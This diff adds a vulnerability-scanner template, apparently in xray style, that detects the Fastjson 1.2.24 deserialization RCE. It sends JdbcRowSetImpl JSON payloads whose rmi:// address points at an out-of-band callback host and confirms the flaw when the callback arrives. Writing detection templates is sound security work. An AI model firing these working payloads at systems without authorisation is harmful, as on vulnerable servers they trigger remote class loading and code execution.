@@ -1,0 +1,44 @@
+id: fastjson-1-2-24-rce
+
+info:
+  name: Fastjson 1.2.24 Deserialization RCE
+  author: zh
+  severity: critical
+  reference:
+    - https://github.com/vulhub/vulhub/tree/master/fastjson/1.2.24-rce
+    - https://www.freebuf.com/vuls/208339.html
+    - https://github.com/wyzxxz/fastjson_rce_tool
+
+set:
+  reverse: newReverse()
+  reverseURL: reverse.url.host
+rules:
+  r0:
+    request:
+      method: POST
+      path: /
+      headers:
+        Content-Type: application/json; charset=utf-8
+      body: |
+        {
+            "b":{
+                "@type":"com.sun.rowset.JdbcRowSetImpl",
+                "dataSourceName":"rmi://{{reverseURL}}/Exploit",
+                "autoCommit":true
+            }
+        }
+    expression: reverse.wait(5)
+  r1:
+    request:
+      method: POST
+      path: /
+      headers:
+        Content-Type: application/json; charset=utf-8
+      body: |
+        {
+           "@type":"com.sun.rowset.JdbcRowSetImpl",
+           "dataSourceName":"rmi://{{reverseURL}}/Exploit",
+           "autoCommit":true
+        }
+    expression: reverse.wait(5)
+expression: r0() || r1()
